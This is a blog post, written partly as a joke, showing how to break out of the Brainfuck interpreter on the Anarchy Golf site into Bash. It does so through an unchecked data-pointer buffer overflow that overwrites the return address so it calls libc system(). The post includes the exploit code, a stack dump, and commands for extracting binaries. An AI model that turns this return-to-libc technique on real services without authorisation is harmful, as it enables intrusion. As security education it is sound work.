---
category: blog
layout: post
redirect_from:
    - "/blog/2016/03/31/bash-on-brainfuck-on-anarchy-golf/"
date: 2016-04-01T07:37:20+09:00
tags: [ "pwn", "golf", "brainfuck", "esolang" ]
---

# How to execute Bash on Brainfuck on Anarchy Golf

Brainfuck is Turing-complete.[^1][^2]

## tl;dr

-   pwn
-   bof
-   rop

## demo

<http://golf.shinh.org/reveal.rb?print+file/kimiyuki_1458840493>

## the code

This is not golfed yet.

Also in this code, the shell script must have balanced `[` `]`.
You can easily avoid this restriction, putting enough amount of `[`s before the shell script.
Or you can simply remove the shell script from the stack of interpreter: move the data-pointer to the code-area, and fill them with zeros (self-modifying).

``` brainfuck
# skip code and data
# +[->+>[<]<]>>->
# <

# make pointer to system
# >>>> >>>>
# >+<     >[<+>>+<-]< 0
# [>++<-] >[<+>> <-]< 1
# [>++<-] >[<+>>+<-]< 2
# [>++<-] >[<+>>+<-]< 3
# [>++<-] >[<+>> <-]< 4
# [>++<-] >[<+>> <-]< 5
# [>++<-] >[<+>>+<-]< 6
# [>++<-] >[<+>> <-]< 7
# [>++<-] >[<+>>+<-]< 8
# [>++<-] >[<+>> <-]< 9
# [>++<-] >[<+>> <-]< 10
# [>++<-] >[<+>>+<-]< 11
# [>++<-] >[<+>> <-]< 12
# [>++<-] >[<+>>+<-]< 13
# [>++<-] >[<+>>+<-]< 14
# [>++<-] >[<+>> <-]< 15
# [>++<-] >[<+>> <-]< 16
# [>++<-] >[< >>+<-]< 17
# >>

# make pointer to command
# >>++++++++++++++++++
# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> 103
# >>>->+[->+>[<]<]>>--<+[-<+]>>+[-<+[<]< <<+>> >>[>]>+]<<[-<]<
# << +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ 133
# [<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<++++>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>-] 103 4 103

# make command string
# +[->+>[<]<]>>-
# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ 256
# [
#     >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
#     --- 3
#     ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ 256
#     ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#     ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#     <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<-
# ]
# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
# --------------------------------------------------------------------------------------------------- 99

# comment out
# <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< move to zero
# [



WRITE SHELLSCRIPT HERE



# ]
```

## note

This is safe for the server.
This cracks only the brainfuck interpreter, but the sandbox.
You can do only things, that you can do when you choose the bash language on the sandbox.

(And, the site owner said that: <https://twitter.com/shinh/status/713242279176044545>)

## explanation

This technique allows you to execute shellscript (and other programming languages) from the brainfuck language, on the site [Anarchy Golf](http://golf.shinh.org/).

This is much environment-devendent one.
Using the leaked information and the interpreter's vulnerability. They let us to execute the `system` function in libc.

### restriction

You cannot use bash when the *deny exec* feature is used.
Executing shell depends on some kind of `execve` syscall, and the feature disable this syscall, so we cannot exec it.

Of course, still you can call other functions in libc.
You may be able to do other IO actions like making a file.
But the arguments are restricted, and after the call the interpreter always do SEGV.
So it seems very difficult to use this for something meaningful.

### environment

You can easily get the binary of the libc and the binary of the interpreter.

Use <http://golf.shinh.org/check.rb>.
You can run various codes on it, including even `gdb`.
Below commands are usable to get the binaries.

``` sh
$ cat /lib/i386-linux-gnu/i686/nosegneg/libc.so.6 | xz | base64
```

``` sh
$ cat /golf/local/bf | base64
```

The source code of the interpreter exists at <http://esoteric.sange.fi/brainfuck/impl/interp/BFI.c>.

Also, under the execution on the server, the submitted source code exists as `test.bf` (the extension depends on the language.)

### interpreter

The interpreter is:

-   There is no check about the brainfuck's data-pointer.
    -   This is buffer-overflow vulnerability.
-   The cell is `int`.
-   There are no optimization.

So you can pwn it.

### exploit

Let's make a exploitat code.
The goal is execute something equivalent to `system("sh test.bf")`.

At first, see the stack layout of the binary. It is:

```
[stack top]
some small local variables   (int pc, args, xc, prog_len, l; FILE *stream;)

brainfuck instructions       (int p[32768];)
brainfuck cells              (int x[32768];)

saved registers
a return address             <- write this
arguments to main function   <- and this

...

strings of arguments
strings of environment variables   <- also use this

...

[stack bottom]
```

using gdb, around the return address:

``` asm
0000| 0xffffcf18 --> 0x0 
0004| 0xffffcf1c --> 0x0 
0008| 0xffffcf20 --> 0x0 
0012| 0xffffcf24 --> 0x0 
0016| 0xffffcf28 --> 0x0 
0020| 0xffffcf2c --> 0x0 
0024| 0xffffcf30 --> 0x0 
0028| 0xffffcf34 --> 0x0                             [end of cells]
0032| 0xffffcf38 --> 0xffffcf60 --> 0x2                                       <- pop ecx
0036| 0xffffcf3c --> 0x0                                                      <- pop ebx
0040| 0xffffcf40 --> 0xf7f9b000 --> 0x1b0d90                                  <- pop esi
0044| 0xffffcf44 --> 0xf7f9b000 --> 0x1b0d90                                  <- pop edi
0048| 0xffffcf48 --> 0x0                                                      <- pop ebp
0052| 0xffffcf4c --> 0xf7e02527 (<__libc_start_main+247>:   add    esp,0x10)  <- ignored
0056| 0xffffcf50 --> 0xf7f9b000 --> 0x1b0d90                                  <- ignored
0060| 0xffffcf54 --> 0xf7f9b000 --> 0x1b0d90                                  <- ignored
0064| 0xffffcf58 --> 0x0                                                      <- ignored
0068| 0xffffcf5c --> 0xf7e02527 (<__libc_start_main+247>:   add    esp,0x10)  <- ret
0072| 0xffffcf60 --> 0x2 
0076| 0xffffcf64 --> 0xffffcff4 --> 0xffffd1a9 ("/home/user/Desktop/brainfuck/bfi/bfi")
0080| 0xffffcf68 --> 0xffffd000 --> 0xffffd1df ("XDG_SEAT=seat0")
0084| 0xffffcf6c --> 0x0 
0088| 0xffffcf70 --> 0x0 
0092| 0xffffcf74 --> 0x0 
0096| 0xffffcf78 --> 0xf7f9b000 --> 0x1b0d90 
```

To call `system`, we need to set the address to instruction pointer (of the interpreter, `$eip`).
This is done by overwriting the return address of main function, `0xf7e02527`(`__libc_start_main+247`).
You can make this the address to the `system`.
You need only to increment it the offset ($158029$) times.

Next, make the argument. We want to make `sh test.bf` or something like this.
So we must make the command string somewhere.
I made the command as `sh *` in the environment variable string `SUDO_COMMAND=/bin/sh -c cd /; /golf/run 2>&1`.
There is a reason.
This interpreter uses the `int` cells and don't optimize anything at all.
So if you can try to simply make some strings, for example `hoge` (expressed as an integer `0x65676f68`), it requires increment $1701277544$ times and causes TLE, time limit exceeded.
This means that you cannot make long (length is 4 or more) strings without some characters which already exists.

Also we need to set the address to the command string.
When a function is called, the addresses around top of the stack are treated as the arguments.
The 1st argument is the `$esp + 4`.
In this case, the value is a pointer onto stack (`char **argv`).
So you can rewrite it to some pointer to stack, without TLE.
However, the amount to rewrite is not same in every execution.
So you need to count the spaces between the two areas, where return address and something else exists, and where environment variables exists.
And you should know the addresses are fixed on gdb.
So you need to debug using the attach feature of gdb, like:

``` sh
cat <<'EOF' > a.bf
<<<<++++>>>>
EOF

cat <<'EOF' > a.gdb
break *0x80486a6
c
x/4000s $esp
c
quit
EOF
/golf/local/bf a.bf &
gdb -p $! -x a.gdb
```

That's all. The rest is only writing brainfuck. It's easy. Try!

---

# How to execute Bash on Brainfuck on Anarchy Golf

-   Fri Apr  1 21:03:18 JST 2016
    -   added a little

---

# How to execute Bash on Brainfuck on Anarchy Golf

[^1]: As you know, the Turing-completeness has nothing to do with this exploitation.
[^2]: This article is written in English[^3], because some of those who I want to be read by are not Japanese.
[^3]: However I'm a Japanese, so you should read this いい感じ-fully.
